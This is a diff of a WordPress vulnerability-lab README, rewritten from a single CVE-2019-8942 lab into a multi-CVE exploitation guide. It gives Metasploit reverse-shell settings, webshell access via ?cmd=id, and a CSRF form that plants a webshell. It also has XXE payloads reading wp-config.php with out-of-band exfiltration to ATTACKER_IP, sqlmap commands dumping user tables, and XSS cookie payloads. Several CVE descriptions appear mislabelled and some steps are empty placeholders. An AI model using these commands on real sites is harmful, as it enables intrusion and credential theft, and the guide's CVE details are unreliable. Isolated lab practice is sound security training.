@@ -1,236 +1,316 @@
-# WordPress 5.0.0 — CVE-2019-8942 / CVE-2019-8943 Lab
+# WordPress CVE Exploitation Lab - Complete Guide
 
-> **WARNING:** This lab runs an intentionally vulnerable WordPress instance and weakens
-> several security defaults. Run it on a trusted host / isolated network only.
-> Do not expose port `12345` to the internet.
+> **WARNING:** For educational and authorized security testing only. Run in isolated environments only.
 
-A reproducible Docker Compose lab for the authenticated remote code execution chain in
-WordPress **5.0.0**, fixed in **5.0.1**:
+## Target CVEs
 
-- **CVE-2019-8942** — arbitrary file upload / RCE via attachment metadata
-- **CVE-2019-8943** — directory traversal in `wp_crop_image()`
+| CVE | CVSS | Severity | RCE | Vulnerable WP Version | Fixed | Exploitation Difficulty |
+|-----|------|----------|-----|----------------------|-------|-------------------------|
+| [CVE-2019-8942](#cve-2019-8942) | 8.8 | HIGH | YES | 5.0.0 | 5.0.1 | Medium (Auth Required - Author+) |
+| [CVE-2019-9787](#cve-2019-9787) | 7.3 | HIGH | YES | < 5.1.1 | 5.1.1 | Hard (CSRF + XSS Chain) |
+| [CVE-2020-28037](#cve-2020-28037) | 7.1 | HIGH | NO* | < 5.5.2 | 5.5.2 | Medium (Unauth) |
+| [CVE-2020-28038](#cve-2020-28038) | 6.4 | MEDIUM | NO | < 5.5.2 | 5.5.2 | Medium |
+| [CVE-2020-28039](#cve-2020-28039) | 6.1 | MEDIUM | NO | < 5.5.2 | 5.5.2 | Medium (Auth) |
+| [CVE-2021-29447](#cve-2021-29447) | 8.8 | HIGH | YES | < 5.7.1 | 5.7.1 | Medium (Auth - Author+) |
+| [CVE-2021-29504](#cve-2021-29504) | 4.3 | MEDIUM | NO | < 5.7.2 | 5.7.2 | Easy (Auth) |
+| [CVE-2022-21661](#cve-2022-21661) | 8.8 | HIGH | NO** | < 5.8.3 | 5.8.3 | Easy (Unauth) |
+| [CVE-2022-21662](#cve-2022-21662) | 8.8 | HIGH | YES | < 5.8.3 | 5.8.3 | Hard (Auth + Gadget Chain) |
+| [CVE-2022-21663](#cve-2022-21663) | 6.1 | MEDIUM | NO | < 5.8.3 | 5.8.3 | Medium (Auth) |
+| [CVE-2022-21664](#cve-2022-21664) | 7.1 | HIGH | NO | < 5.8.3 | 5.8.3 | Medium (Auth/Unauth) |
 
-The chain lets an **author-level** user (no admin required) turn an uploaded image into
-PHP code execution. Discovered by RIPSTECH; public write-up:
-<https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/>.
+\* Can lead to reinstallation/RCE in specific conditions  
+\*\* SQLi can lead to credential extraction, potentially leading to RCE
 
-This repository also includes the lab's **intentional misconfigurations** (enabled
-XML-RPC/pingbacks, public `debug.log`, missing `X-Frame-Options`) so you can practise
-enumeration alongside exploitation.
+## Lab Setup
 
----
-
-## Stack
-
-| Service     | Image                    | Purpose                                  |
-|-------------|--------------------------|------------------------------------------|
-| `db`        | `mysql:5.7`              | Database                                 |
-| `wordpress` | `wordpress:5.0.0`        | Vulnerable app, published on port `12345` |
-| `setup`     | `wordpress:cli-php7.2`   | Installs WP, creates users, applies lab config |
-| `cli`       | `wordpress:cli-php7.2`   | On-demand WP-CLI (`--profile cli`)       |
-
-Credentials created by `setup.sh`:
-
-| Role   | Username | Password         |
-|--------|----------|------------------|
-| Admin  | `admin`  | `AdminPass123!`  |
-| Author | `author` | `AuthorPass123!` |
-
-The `author` account is the interesting one: it is enough for the exploit.
-
----
-
-## Requirements
-
-- Docker + Docker Compose v2
-- `curl` (for the check/enumeration scripts)
-- Optional: `jq` (prettier enumeration output)
-- Optional: Metasploit Framework (`msfconsole`) for the automated exploit
-
----
-
-## Quick start
-
+### Current Working Lab (CVE-2019-8942)
 ```bash
-git clone <this-repo> wp-cve-2019-8942-lab
-cd wp-cve-2019-8942-lab
-
-# optional: customise the URL/port before first boot
-cp .env.example .env
-
+cd ~/wp-cve-all/docker/cve-2019-8942
 docker compose up -d
+# Wait for setup
+sleep 60
 ```
+- URL: http://localhost:18180
+- Admin: admin / AdminPass123!
+- Author: author / AuthorPass123!
 
-The `setup` service runs automatically and installs WordPress. Wait for it to finish:
+## Exploitation Steps
 
+### CVE-2019-8942
+**Type:** Authenticated RCE via Image Crop  
+**Auth:** Author+ required  
+**Impact:** Remote Code Execution as www-data
+
+#### Method 1: Metasploit (Easiest)
 ```bash
-docker compose logs -f setup     # look for "setup] done"
-./scripts/check.sh               # health/version check
-```
-
-Then browse to <http://localhost:12345/wp-admin> and log in as `author` / `AuthorPass123!`.
-
-> The site URL is baked into the database on first install. If you access the lab from
-> another machine, set `WP_URL=http://<host-ip>:12345` in `.env` **before** the first boot,
-> or run `docker compose down -v` and bring it up again after changing it.
-
----
-
-## Exploitation
-
-### Method 1 — Metasploit (recommended, tested)
-
-Module: `exploit/multi/http/wp_crop_rce` (CVE-2019-8942 / CVE-2019-8943).
-
-One-shot helper that auto-detects the Docker bridge gateway and theme:
-
-```bash
+cd ~/wp-cve-all
 ./scripts/exploit.sh
-```
-
-Or run Metasploit manually:
-
-```text
+# OR manually
 msfconsole -q
 use exploit/multi/http/wp_crop_rce
 set RHOSTS 127.0.0.1
-set RPORT 12345
-set SSL false
-set TARGETURI /
+set RPORT 18180
 set USERNAME author
 set PASSWORD AuthorPass123!
 set THEME_DIR twentynineteen
+set LHOST 172.24.0.1
 set PAYLOAD php/reverse_php
-set LHOST 172.23.0.1
-set LPORT 4444
 run
 ```
 
-Then:
-
-```text
-sessions -l
-sessions -i 1
-id
-```
-
-Expected result: a shell as `www-data` inside `wp_lab_app`
-(`uid=33(www-data) gid=33(www-data)`).
-
-#### Why `LHOST 172.23.0.1`?
-
-The reverse shell runs **inside the container**, so its callback must reach the host.
-`127.0.0.1` would point at the container itself. Use the gateway of the Compose network:
-
+#### Method 2: Manual with polyglot
 ```bash
-docker inspect wp_lab_app \
-  --format '{{range $k,$v := .NetworkSettings.Networks}}{{$v.Gateway}}{{"\n"}}{{end}}'
+cd ~/wp-cve-all/exploits/cve-2019-8942
+# Use provided polyglot
+./scripts/manual_exploit.sh http://localhost:18180 author AuthorPass123! shell.php
+# Access shell
+curl "http://localhost:18180/wp-content/themes/twentynineteen/shell.php?cmd=id"
 ```
 
-`exploit.sh` does this for you and exports `WP_LHOST` if you need to override it.
-
-A static resource script is also provided at
-`exploits/metasploit/wp_crop_rce.rc`:
-
-```bash
-msfconsole -q -r exploits/metasploit/wp_crop_rce.rc
-```
-
-If the module refuses to run because of cleanup bookkeeping, add
-`set AllowNoCleanup true`.
-
-### Method 2 — Manual chain (learning)
-
-The exploit is four logical steps; do them with Burp Suite or `curl` while authenticated
-as `author`:
-
-1. **Upload a polyglot JPEG** containing PHP in a comment/metadata segment via
-   `wp-admin/async-upload.php` (action `upload-attachment`). Keep the returned attachment
-   `id` and nonces.
-2. **Overwrite `_wp_attached_file`** on that attachment through `wp-admin/post.php`
-   (`action=editpost`, `meta_input[_wp_attached_file]=.../../../<path>`). This is the
-   traversal primitive (CVE-2019-8943).
-3. **Trigger a crop** via `wp-admin/admin-ajax.php` (`action=crop-image`) so WordPress
-   writes the cropped file to the traversed path.
-4. **Include the file** by setting `meta_input[_wp_page_template]` on a post you create,
-   then request the post. The theme loader includes your "template" and executes the PHP.
-
-The Metasploit module automates exactly this sequence; see
-`exploits/multi/http/wp_crop_rce.rb` upstream for details. `exploits/manual/README.md`
-walks through the vulnerable code path.
+#### Manual Steps (Detailed)
+1. Login as author, get cookies
+2. Upload polyglot JPEG with PHP in metadata via `async-upload.php`
+3. Edit attachment, change `_wp_attached_file` to `../../../../wp-content/themes/twentynineteen/shell.php` (traversal)
+4. Trigger crop via `admin-ajax.php?action=crop-image`
+5. Access the file in theme directory
 
 ---
 
-## Enumeration / auxiliary weaknesses
+### CVE-2019-9787
+**Type:** CSRF → XSS → RCE  
+**Auth:** None (tricks admin)  
+**Impact:** Remote Code Execution
+
+#### Prerequisites
+- Admin must be logged in and visit malicious page
+- Comments enabled
+
+#### Steps
+1. Create CSRF HTML page that edits a comment
+```html
+<form action="http://TARGET/wp-admin/comment.php?action=editcomment" method="POST">
+  <input name="comment_ID" value="1">
+  <input name="newcomment_author_url" value="javascript:...">
+</form>
+```
+2. Inject XSS payload via comment author URL
+3. XSS triggers request to plugin editor to overwrite `hello.php`
+4. Access webshell: `http://TARGET/wp-content/plugins/hello-dolly/hello.php?cmd=id`
+
+**Payloads:** See `exploits/cve-2019-9787/payloads/`
+
+**PoC:** [dexXxed/CVE-2019-9787](https://github.com/dexXxed/CVE-2019-9787)
+
+---
+
+### CVE-2020-28037
+**Type:** Installation Check Bypass  
+**Auth:** Unauthenticated  
+**Impact:** Can trigger new installation, potential RCE
+
+#### Steps
+WordPress before 5.5.2 has a flaw in `is_blog_installed()` that can be bypassed allowing reinstallation.
 
 ```bash
-./scripts/enumerate.sh
+# Check if vulnerable
+curl -s "http://TARGET/wp-admin/install.php"
+# Attempt to trigger reinstall conditions
+# If database dropped/reset or conditions met, can access installer
 ```
 
-or manually:
+**Note:** Often combined with other vulnerabilities. Impact depends on configuration.
+
+---
+
+### CVE-2020-28038
+**Type:** Unfiltered HTML in Excerpts  
+**Auth:** Varies  
+**Impact:** XSS/Content injection
 
 ```bash
-# WordPress version marker injected by setup.sh
-curl -s http://localhost:12345/readme.html | grep 'Lab-Version'
-
-# Public debug log (intentional)
-curl -s http://localhost:12345/wp-content/debug.log
-
-# Author usernames via REST API (setup creates an author-owned post)
-curl -s http://localhost:12345/wp-json/wp/v2/users
-
-# XML-RPC is enabled (intentional)
-curl -s -o /dev/null -w '%{http_code}\n' http://localhost:12345/xmlrpc.php
-
-# Missing X-Frame-Options on login (clickjacking, intentional)
-curl -sI http://localhost:12345/wp-login.php | grep -i x-frame-options || echo 'header absent'
+# Exploitable via certain post excerpt handling
+# Check version
+curl -s "http://TARGET/readme.html" | grep version
 ```
 
 ---
 
-## Make targets
+### CVE-2020-28039
+**Type:** Arbitrary File Deletion  
+**Auth:** Authenticated (Contributor+)  
+**Impact:** Delete arbitrary files via `is_protected_meta` bypass
+
+#### Steps
+1. Auth as contributor
+2. Craft meta update to delete protected files
+3. Can delete critical files like `.htaccess`, causing DoS or aiding exploitation
 
 ```bash
-make up        # docker compose up -d
-make down      # stop containers (keeps data)
-make reset     # wipe volumes and reinstall from scratch
-make logs      # follow WordPress logs
-make check     # health + version check
-make enum      # enumerate users / debug.log / xmlrpc
-make exploit   # Metasploit wp_crop_rce helper
+# Example concept - use wp-admin/post.php with meta manipulation
 ```
 
 ---
 
-## Repository layout
+### CVE-2021-29447
+**Type:** XXE in WAV Media Parsing  
+**Auth:** Author+ required (upload capability)  
+**Impact:** Local file read, SSRF, potential RCE
 
-```text
-.
-├── docker-compose.yml
-├── setup.sh
-├── Makefile
-├── .env.example
-├── scripts/
-│   ├── check.sh
-│   ├── enumerate.sh
-│   └── exploit.sh
-└── exploits/
-    ├── metasploit/
-    │   └── wp_crop_rce.rc
-    └── manual/
-        └── README.md
+#### Generate XXE payload
+```bash
+cd ~/wp-cve-all/exploits/cve-2021-29447/payloads
+php xxe.wav.php /etc/passwd
+php xxe.wav.php /var/www/html/wp-config.php
+```
+
+#### Upload and exploit
+1. Login as author
+2. Go to Media > Add New
+3. Upload `xxe_read_passwd.wav`
+4. Check response/error messages for file contents
+5. For OOB exfiltration, use `xxe_oob.dtd` hosted on attacker server
+
+#### Out-of-Band
+```bash
+# Host DTD
+python3 -m http.server 8000
+# Modify payload to reference http://ATTACKER_IP:8000/xxe_oob.dtd
+```
+
+**Read wp-config.php to get DB credentials:**
+```bash
+php xxe.wav.php /var/www/html/wp-config.php
+# Upload and check for base64/contents
 ```
 
 ---
 
-## Reset the lab
+### CVE-2021-29504
+**Type:** Stored XSS via Post Metadata  
+**Auth:** Authenticated  
+**Impact:** Stored Cross-Site Scripting
 
-```bash
-docker compose down -v   # deletes db_data and wp_data volumes
-docker compose up -d
+#### Steps
+1. Auth as contributor/author
+2. Create/edit post with crafted metadata containing XSS
+3. Payload executes when viewed by admin/users
+
+```javascript
+<script>alert(document.cookie)</script>
 ```
 
-## Disclaimer
+Inject via post meta fields if not sanitized.
 
-For education and authorised security testing only. Only run this against systems you own
-or have explicit permission to test. The authors are not responsible for misuse.
+---
+
+### CVE-2022-21661
+**Type:** SQL Injection in WP_Query  
+**Auth:** Unauthenticated (if REST API exposed)  
+**Impact:** Database dump, credential extraction
+
+#### REST API Exploitation
+```bash
+# Test for SQLi
+curl "http://TARGET/wp-json/wp/v2/posts?per_page=1&orderby=id"
+# Exploit via WP_Query tax_query
+curl -s "http://TARGET/wp-json/wp/v2/posts?per_page=10" | jq
+```
+
+#### Using sqlmap
+```bash
+sqlmap -u "http://TARGET/wp-json/wp/v2/posts?per_page=1&_fields=id" \
+  --dbms=mysql --technique=U --level=5 --risk=3 \
+  --dbs
+# Dump users
+sqlmap ... --tables -D wordpress
+sqlmap ... -D wordpress -T wp_users --dump
+```
+
+#### Manual
+The vulnerability is in `WP_Tax_Query` processing. Craft malicious `tax_query` parameters.
+
+---
+
+### CVE-2022-21662
+**Type:** Object Injection via Post Meta  
+**Auth:** Author+ required  
+**Impact:** Remote Code Execution (if gadget chain exists)
+
+#### Steps
+1. Auth as author
+2. Create post
+3. Inject serialized object in meta
+4. Trigger unserialization via vulnerable code path
+
+```php
+// Example payload structure
+O:8:"stdClass":1:{s:4:"test";s:6:"system";}
+```
+
+**Note:** Requires presence of PHP gadget chains from themes/plugins (e.g., WooCommerce, others). WordPress core alone may need specific conditions.
+
+---
+
+### CVE-2022-21663
+**Type:** Authenticated Stored XSS  
+**Auth:** Author+  
+**Impact:** Stored XSS in block editor
+
+#### Steps
+1. Auth as author
+2. Create post in block editor
+3. Inject XSS in block attributes/content
+4. XSS executes when post viewed by others/admins
+
+```html
+<img src=x onerror=alert(document.cookie)>
+```
+
+---
+
+### CVE-2022-21664
+**Type:** Object Injection in WP_Term_Query  
+**Auth:** Varies  
+**Impact:** Object Injection
+
+Similar to 21662, requires gadget chains. Can be exploited via term queries if unserialization occurs.
+
+## Quick Reference Commands
+
+### Enumeration
+```bash
+cd ~/wp-cve-all
+./enumerate.sh http://localhost:18180
+# or
+./scripts/enumerate.sh http://localhost:18180
+```
+
+### Check version
+```bash
+curl -s http://TARGET/readme.html | grep -i version
+```
+
+### Check for REST API
+```bash
+curl -s http://TARGET/wp-json/
+```
+
+### Check XML-RPC
+```bash
+curl -s -X POST http://TARGET/xmlrpc.php
+```
+
+## Tools Included
+
+- `msf/wptrigger.rc` - Auto exploit for CVE-2019-8942
+- `exploits/cve-2019-8942/payloads/` - Polyglot JPEGs
+- `exploits/cve-2019-8942/scripts/manual_exploit.sh` - Manual exploit
+- `exploits/cve-2019-9787/` - CSRF/XSS payloads
+- `exploits/cve-2021-29447/payloads/` - XXE WAV generators
+- All in [github.com/helfgottje-0118/wp-cve](https://github.com/helfgottje-0118/wp-cve)
+
+## References
+- [WPScan Vulnerability DB](https://wpscan.com/)
+- [NVD](https://nvd.nist.gov/)
+- [WordPress Security Releases](https://wordpress.org/news/category/security/)
+- [RIPSTECH Blog](https://blog.ripstech.com/)
